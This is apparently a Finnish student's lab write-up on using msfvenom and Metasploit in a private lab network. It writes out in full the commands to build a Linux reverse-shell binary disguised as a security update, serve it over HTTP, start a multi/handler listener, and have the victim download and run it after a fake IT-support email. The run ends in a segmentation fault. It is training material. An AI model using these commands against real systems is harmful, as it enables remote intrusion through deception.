# Koita Simpukoita

## a) Venom. Tee msfvenom-työkalulla haittaohjelma, joka soittaa kotiin (reverse shell). Ota yhteys vastaan metasploitin multi/handler -työkalulla.

Aloitin tutustumalla msfvenomin käyttöön. CyberOffensiven video (CyberOffense, 17.4.2022) havainnollisti työkalun toimintaa hienosti. Tosin hänen esimerkissä hyökättiin windows järjestelmään. duck-secin reposta (duck-sec, 20.2.2024) löysin kätevän cheatsheetin eri payloadeista.

Loin payloadin msfvenomilla.
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.101 LPORT=8080 -f elf > very_important_security_update.elf
```
- `-p` Määrittää että käytetään payloadia
- `linux/x86/shell/reverse_tcp` Linuxi x86 arkkitehtuurin reverse TCP shell scripti.
- `LHOST=192.168.56.101` Kuuntelevan koneen ip osoite
- `LPORT=8080` Kuuntelevan koneen kohdeportti
- `-f elf` Määritellään, että binääri luodaan elf-tiedostoon (Executable and Linkable Format). Tämä on standardi binääriformaatti *NIX järjestelmissä (wikipedia).
- `very_important_security_update.elf` Sosiaalisen manipuloinnin mestariteos. Tällä tiedostonimellä saadaan kohdekoneen käyttäjä klikkaamaan linkistä 100% varmuudella.

![](h6/create_venom_payload.png)

Jotta voisin saada tämän payloadin kohdekoneelle, päätin käyttää samaa tekniikkaa mitä esimerkkivideossa (CyberOffense, 17.4.2022) käytettiin.

    Ensin loin uuden kansion johon siirsin binäärin.
```
mkdir security_updates
mv very_important_security_update.elf security_updates
```
![](h6/new_directory.png)

Laitoin tämän kansion pyörimään http -serverillä.

```
python3 -m http.server
```
- `-m http.server` Määritellään moduuli, jonka python3 ajaa. Tässä tapauksessa http.server.

![](h6/http.server.png)

Tämä pitää jättää terminaaliin pyörimään, jotta siihen voi ottaa yhteyden kohdekoneelta. Avasin siis uuden terminaalin ja siellä avasin palomuurista http -serverin portin sekä hyökkäyksessä käytettävää kuuntelevaa porttia.

```
sudo ufw allow 8080/tcp
sudo ufw allow 8000/tcp
```
![](h6/firewall.png)

Tässä kohtaa avasin vielä listenerin metasploitin avulla.

```
sudo msfconsole
search exploit/multi/handler
use 4
set LHOST 192.168.56.101
set LPORT 8080
run
```

![](h6/listener.png)

Sitten siirryin hölmön toimistorotan rooliin. IT-tuelta oli tullut sähköpostia, että koneeseeni on saatettu murtautua. Pitäisi äkkiä käydä antamassa seuraavat komennot terminaaliin, jotta tunkeutuminen saadaan estettyä.

```
wget 192.168.56.101:8000/very_important_security_update.elf
chmod u+x very_important_security_update.elf
./very_important_security_update.elf
```

Kaikki sujui ihan nätisti, kunnes haittaohjelma ajettiin.

Tuli ilmoitus, että haittaohjelma on ladattu onnistuneesti.
![](h6/GET_request.png)

Harri Hölmöläinen toisti antamani komennot.

![](h6/wget_haittaohjelma.png)

Kun haittaohjelma ajettiin, tuli segmentation fault.
![](h6/segmentation_fault.png)

Metasploitin päässä näin, että yhteyttä oltiin otettu oikeasta osoitteesta, mutta yhteys oli katkennut välittömästi.

![](h6/unsuccessful.png)

## Lähteet
CyberOffense. 17.4.2022. Use Msfvenom to Create a Reverse TCP Payload. Katsottavissa: https://www.youtube.com/watch?v=ZqWfDrD2WVY. Katsottu: 28.4.2026.

duck-sec. 20.2.2024. msfvenom-revshell-cheatsheet. Luettavissa: https://github.com/duck-sec/msfvenom-revshell-cheatsheet. Luettu: 29.4.2026.

Wikipedia. Executable and Linkable Format. Luettavissa: https://en.wikipedia.org/wiki/Executable_and_Linkable_Format. Luettu: 30.4.2026. 